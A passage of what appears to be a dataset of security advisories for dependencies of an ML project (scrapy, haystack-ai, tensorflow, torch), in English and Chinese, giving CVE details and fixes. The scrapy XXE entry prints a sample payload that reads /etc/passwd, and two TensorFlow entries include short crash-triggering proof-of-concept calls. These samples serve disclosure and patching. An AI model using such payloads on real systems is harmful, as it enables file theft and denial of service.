Upgrade to Scrapy 2.6.2.

If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.2 is not an option, you may upgrade to Scrapy 1.8.3 instead.

### Workarounds

If you cannot upgrade, make sure that any code that changes the value of the `proxy` request meta also removes the `Proxy-Authorization` header from the request if present.

### For more information

If you have any questions or comments about this advisory:
* [Open an issue](https://github.com/scrapy/scrapy/issues)
* [Email us](mailto:opensource@zyte.com)
",3,-2
mlflow_mlflow,scrapy,,True,,,2022-03-02,"### Impact

Responses from domain names whose public domain name suffix contains 1 or more periods (e.g. responses from `example.co.uk`, given its public domain name suffix is `co.uk`) are able to set cookies that are included in requests to any other domain sharing the same domain name suffix.

### Patches

Upgrade to Scrapy 2.6.0, which restricts cookies with their domain set to any of those in the [public suffix list](https://publicsuffix.org/).

If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.

### Workarounds

The only workaround for unpatched versions of Scrapy is to [disable cookies altogether](https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED), or [limit target domains](https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains) to a subset that does not include domain names with one of the public domain suffixes affected (those with 1 or more periods).

### References
* https://publicsuffix.org/

### For more information

If you have any questions or comments about this advisory:
* [Open an issue](https://github.com/scrapy/scrapy/issues)
* [Email us](mailto:opensource@zyte.com)
",3,-2
mlflow_mlflow,scrapy,,True,,CWE-256,2022-07-31,"## Overview
[Scrapy](https://pypi.org/project/Scrapy/) is a high-level web crawling and web scraping framework, used to crawl websites and extract structured data from their pages.

Affected versions of this package are vulnerable to Credential Exposure via the `process_request()` function in `downloadermiddlewares/httpproxy.py`. A proxy can leak credentials to another proxy if third-party downloader middlewares leave `Proxy-Authentication` headers unchanged when updating `proxy` metadata for a new request. 

**NOTE:** 
To fully mitigate the effects of vulnerability, replacing or upgrading the third-party downloader middleware might be necessary after upgrading.
## Remediation
Upgrade `Scrapy` to version 1.8.3, 2.6.2 or higher.
## References
- [GitHub Commit](https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f)
",3,2
mlflow_mlflow,scrapy,,True,,CWE-601,2019-05-29,"## Overview

[Scrapy](https://pypi.org/project/Scrapy/) is a high-level web crawling and web scraping framework, used to crawl websites and extract structured data from their pages.


Affected versions of this package are vulnerable to XML External Entity (XXE) Injection
via the `sitemap` reader.

## Details
XXE Injection is a type of attack against an application that parses XML input.
XML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.

Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.

For example, below is a sample XML document, containing an XML element- username.

```xml
<?xml version=""1.0"" encoding=""ISO-8859-1""?>
   <username>John</username>
</xml>
```

An external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.

```xml
<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>
   <username>&xxe;</username>
</xml>
```

Other XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.

## Remediation

Upgrade `Scrapy` to version 0.24.0 or higher.


## References

- [GitHub Commit](https://github.com/scrapy/scrapy/pull/676/commits/43217fd698135b4795d191f8a935f3ba0b869c54)

- [GitHub PR](https://github.com/scrapy/scrapy/pull/676)
",2,2
mlflow_mlflow,scrapy,,True,,CWE-200,2022-03-04,"## Overview
[Scrapy](https://pypi.org/project/Scrapy/) is a high-level web crawling and web scraping framework, used to crawl websites and extract structured data from their pages.

Affected versions of this package are vulnerable to Information Exposure via responses from domain names whose public domain name suffix contains 1 or more periods are able to set cookies that are included in requests to any other domain sharing the same domain name suffix.
## Remediation
Upgrade `Scrapy` to version 1.8.2, 2.6.0 or higher.
## References
- [GitHub Fix Commit v1.8.2](https://github.com/scrapy/scrapy/commit/91706f58b70da702d32035b6c55e3d5823551f1d)
- [GitHub Fix Commit v2.6.0](https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a)
- [GitHub Release](https://github.com/scrapy/scrapy/releases/tag/1.8.2)
",2,2
mlflow_mlflow,scrapy,,True,CVE-2024-1892,CWE-1333,,Scrapy 是一个用 Python 编写的开源网络爬虫框架，它用于抓取网站并提取结构化数据。Scrapy 存在一个正则表达式拒绝服务 (ReDoS) 漏洞，该漏洞来源于在使用 `XMLFeedSpider` 类解析 XML 内容时，使用了复杂度低效的正则表达式。当处理恶意响应时，攻击者可以导致极端的 CPU 和内存使用，从而使服务不可用。具体来说，当攻击者提供特制的 XML 内容时，由于正则表达式的误用，系统可能会陷入长时间的挂起状态，消耗大量资源。,2,1
mlflow_mlflow,scrapy,,True,,CWE-346,2024-02-16,"## Overview
[Scrapy](https://pypi.org/project/Scrapy/) is a high-level web crawling and web scraping framework, used to crawl websites and extract structured data from their pages.

Affected versions of this package are vulnerable to Origin Validation Error due to the improper handling of the `Authorization` header during cross-domain redirects. An attacker can leak sensitive information by inducing the server to redirect a request with the `Authorization` header to a different domain. 

## Workarounds

1)Make sure that the Authentication header, either directly or through some third-party plugin is not used.

2)If that header is needed in some requests, add `dont_redirect: True` to the `request.meta` dictionary of those requests to disable following redirects for them.

3)If same domain redirect support is needed on those requests, make sure you trust the target website not to redirect your requests to a different domain.
## Remediation
Upgrade `Scrapy` to version 1.8.4, 2.11.1 or higher.
## References
- [Github Commit](https://github.com/scrapy/scrapy/commit/080fecd8900b6b1f94e8e143e90338279ba8d6e5)
- [GitHub Commit](https://github.com/scrapy/scrapy/commit/ee7bd9d217fc126063575d5649f00bdeeca2faae)
",2,2
mlflow_mlflow,scrapy,,True,CVE-2021-41125,CWE-200 CWE-522,2021-10-06,"Scrapy是一个用Python编写的自由且开源的网络爬虫框架。
Scrapy 存在信息泄露漏洞，如果您使用HttpAuthMiddleware（即http_user和http_pass属性）进行HTTP 身份验证，则所有请求都将向请求目标公开您的凭据。",3,0
mlflow_mlflow,scrapy,,True,CVE-2024-3572,CWE-409,,Scrapy 是一个用 Python 编写的高阶网络爬虫和网络抓取框架，旨在从网站提取结构化数据。该组件的安全漏洞源于使用 lxml.etree.fromstring 函数来解析不受信任的 XML 数据时缺乏适当的验证。攻击者可以通过提交特制的 XML 数据实施拒绝服务攻击、访问本地文件、生成网络连接或绕过防火墙，这可能导致系统可用性严重降低。,2,1
mlflow_mlflow,scrapy,,True,CVE-2024-3574,CWE-200,,Scrapy 是一个用 Python 编写的高层次网络爬虫和网络抓取框架，旨在从网页中提取结构化数据。Scrapy 2.10.1 版本存在信息泄露漏洞，漏洞源于跨域重定向时未能删除 `Authorization` 请求头，导致敏感凭证暴露给未经授权的参与者，这可能会导致账户劫持。攻击者可以利用这一漏洞通过构造重定向请求来获取受害者的认证信息。,2,1
mlflow_mlflow,scrapy,,True,CVE-2024-1968,CWE-200,,Scrapy 是一个用 Python 编写的高层次网页爬取和抓取框架，旨在从网页中提取结构化数据。受影响的版本存在信息泄露漏洞，该漏洞源于在跨域重定向中对 HTTP 头部处理不当。攻击者可以在同一域但更改方案或端口的重定向场景中拦截 `Authorization` 头，这可能导致敏感信息泄露。该漏洞位于重定向中间件的 `_build_redirect_request` 函数中，违反了应删除该头部的相关标准。,2,1
mlflow_mlflow,haystack-ai,,True,CVE-2024-41950,CWE-1336,2024-07-31,"Haystack是deepset开源的一个开源 NLP 框架，可使用 Transformer 模型和 LLM（GPT-4、ChatGPT 等）与用户的数据进行交互。
Haystack 2.3.1之前版本存在安全漏洞。攻击者利用该漏洞可以导致远程代码执行。",4,0
mlflow_mlflow,tensorflow,>=2.10.0,True,,,2022-11-22,"### Impact
Another instance of CVE-2022-35935, where `SobolSample` is vulnerable to a denial of service via assumed scalar inputs, was found and fixed.
```python
import tensorflow as tf
tf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))
```

### Patches
We have patched the issue in GitHub commits [c65c67f88ad770662e8f191269a907bf2b94b1bf](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf) and [02400ea266bd811fc016a848445de1bbff3a23a0](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)

The fix will be included in TensorFlow 2.11. We will also cherrypick both commits on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range. TensorFlow 2.7.4 will have the first commit cherrypicked.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by:
- Kang Hong Jin from Singapore Management University
- Neophytos Christou, Secure Systems Labs, Brown University
- 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
- Pattarakrit Rattankul
",4,-2
mlflow_mlflow,tensorflow,>=2.10.0,True,,,2022-11-22,"### Impact
Another instance of CVE-2022-35991, where `TensorListScatter` and `TensorListScatterV2` crash via non scalar inputs in`element_shape`, was found in eager mode and fixed.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_3=''
tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, 
element_shape=arg_2, name=arg_3)
```

### Patches
We have patched the issue in GitHub commit [bf9932fc907aff0e9e8cccf769e8b00d30fd81a1](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattankul
",4,-2
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2023-25660,CWE-476,2023-03-24,Google TensorFlow 是一套用于机器学习的开源平台。该漏洞源于当 `tf.raw_ops.Print` 的参数 `summarize` 为零时，新方法 `SummarizeArray<bool>` 会引用空指针，导致段错误。,2,2
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2022-41909,CWE-20 CWE-476,2022-11-18,Google TensorFlow 是一套用于机器学习的开源平台。在某些版本（如 2.11、2.10.1 及之前的 2.10.x、2.9.3 及之前的 2.9.x 版本，以及 2.8.4 之前的 2.8.x 版本）中，一个无效的 `CompositeTensorVariant` 张量输入 `encoded` 会导致 `tf.raw_ops.CompositeTensorVariantToComponents` 触发段错误存。这是由于输入的验证不当导致的代码缺陷。,3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2023-25669,CWE-697,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在安全漏洞，该漏洞源于如果 `tf.raw_ops.AvgPoolGrad` 的步幅和窗口大小不是正数，它会给出浮点异常。",2,2
mlflow_mlflow,tensorflow,>=2.10.0,True,,CWE-400,2022-11-22,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS) due to another discovered instance of [CVE-2022-35991](https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3026856), in `TensorListScatter` and `TensorListScatterV2` via non scalar inputs.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.4, 2.9.3, 2.10.1 or higher.
## References
- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1)
",3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,,CWE-400,2022-11-22,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS) due to another discovered instance of [CVE-2022-35935](https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-3026914) in `SobolSample` via assumed scalar inputs.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.4, 2.9.3, 2.10.1 or higher.
## References
- [GitHub Commit #1](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf)
- [GitHub Commit #2](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)
",2,2
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2022-41908,CWE-20,2022-11-18,Google TensorFlow是一个用于机器学习的端到端开源平台。该漏洞源于不是UTF-8字节串的输入'token'将在'tf.raw_ops.PyFunc'中触发'CHECK'失败。涉及的版本包括2.8.4之前的版本、2.9.0到2.9.3和2.10.0版本。,3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2023-25661,CWE-20,2023-03-27,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。TensorFlow 2.11.1之前版本存在输入验证错误漏洞，该漏洞源于恶意的无效输入会使tensorflow模型崩溃，并可用于触发拒绝服务攻击。,3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2023-25675,CWE-697,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在安全漏洞，该漏洞源于当使用 XLA 运行 2.12.0 和 2.11.1 之前的版本时，如果给定的参数 weights 与参数 arr 的形状既不相同，也不是长度为 0 的张量，则 `tf.raw_ops.Bincount` 会出现段错误。",2,2
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2022-41883,CWE-125,2022-11-18,Google TensorFlow是一款用于机器学习的开源平台。该漏洞源于操作接收到不同数量的输入时，错误地处理输入大小，导致执行程序崩溃。,3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2023-25672,CWE-476,2023-03-24,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在代码问题漏洞，该漏洞源于函数 `tf.raw_ops.LookupTableImportV2` 无法处理 `values` 参数中的标量并给出 NPE。",2,2
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2023-25668,CWE-122 CWE-125,2023-03-24,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。存在安全漏洞，攻击者可以利用该漏洞访问不受用户控制的堆内存，从而导致程序崩溃或远程代码执行。,1,2
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2022-41895,CWE-125,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果 `MirrorPadGrad` 的输入 `paddings` 过大，TensorFlow 将生成堆信息外带（Out of Band）错误，导致缓冲区溢出。,3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2022-41880,CWE-125,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于 `BaseCandidateSamplerOp` 函数接收到 `true_classes` 中的值大于 `range_max` 时，会发生堆外读取。,3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2022-41896,CWE-20 CWE-1284,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果 `ThreadUnsafeUnigramCandidateSampler` 的输入 `filterbank_channel_count` 大于允许的最大大小，TensorFlow 将崩溃。,3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2022-41898,CWE-20,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。出现此漏洞是因为如果 `SparseFillEmptyRowsGrad` 的输入为空，TensorFlow将崩溃。,3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2023-25665,CWE-476,2023-03-24,Google TensorFlow是一个用于机器学习的开源平台。2.12.0版本之前的2.12版本和2.11.1版本之前的2.11版本存在代码问题，该漏洞源于当'SparseSparseMaximum'被赋予无效的稀疏张量作为输入时，会导致空指针解引用错误。,2,2
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2022-41884,CWE-670,2022-11-18,Google TensorFlow是一款用于机器学习的开源平台。当创建的numpy数组的形状为一个元素为零而其他元素之和为一个大数时，可能导致错误，引发应用程序崩溃。,3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2023-25674,CWE-476,2023-03-24,Google TensorFlow是一个用于机器学习的端到端开源平台。2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在空指针错误，该漏洞源于启用 XLA 的 RandomShuffle 操作。,2,2
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2022-41889,CWE-476,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果将量化张量列表分配给属性，则pywrap代码无法解析张量并返回未捕获的‘nullptr’。,3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2022-41900,CWE-125 CWE-787,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞出现在TensorFlow的池化操作中，导致FractionalMax(AVG)Pool具有非法的pooling_ratio，攻击者可以利用此漏洞访问不受用户控制的堆内存。,2,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2023-27579,CWE-697,2023-03-24,TensorFlow是一个用于机器学习的端到端开源平台。使用小于1的参数“filter_input_channel”构建tflite模型会导致浮点异常(FPE)。该漏洞在2.12版本中被修复。,2,2
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2023-25664,CWE-120 CWE-122,2023-03-24,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于TAvgPoolGrad中存在堆缓冲区溢出，影响版本为2.12.0及之前的版本（不包括2.11.1）。,2,2
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2022-41888,CWE-20,2022-11-18,TensorFlow是一个用于机器学习的开源平台。在GPU上运行时，`tf.image.generate_bounding_box_proposals`函数收到一个未进行检查的`scores`输入，该输入必须为4级。,3,0
mlflow_mlflow,tensorflow,>=2.10.0,True,CVE-2023-25670,CWE-476,2023-03-24,TensorFlow是一个强大的开源机器学习框架，用于构建和训练各种复杂的神经网络模型。在版本2.12.0之前的2.12和版本2.11.1之前的2.11中，QuantizedMatMulWithBiasAndDequantize操作存在零点错误，可能导致空指针解引用问题。,2,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-5480,CWE-77,2024-06-06,PyTorch 是一个流行的开源深度学习框架，广泛用于研究和生产环境。torch.distributed.rpc框架用于在分布式训练场景中支持RPC操作。在2.2.2版本之前，该框架在RPC操作期间没有正确验证被调用的函数，这导致攻击者可以在多CPU RPC通信过程中，通过内置的Python函数（如eval）执行任意命令。,2,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
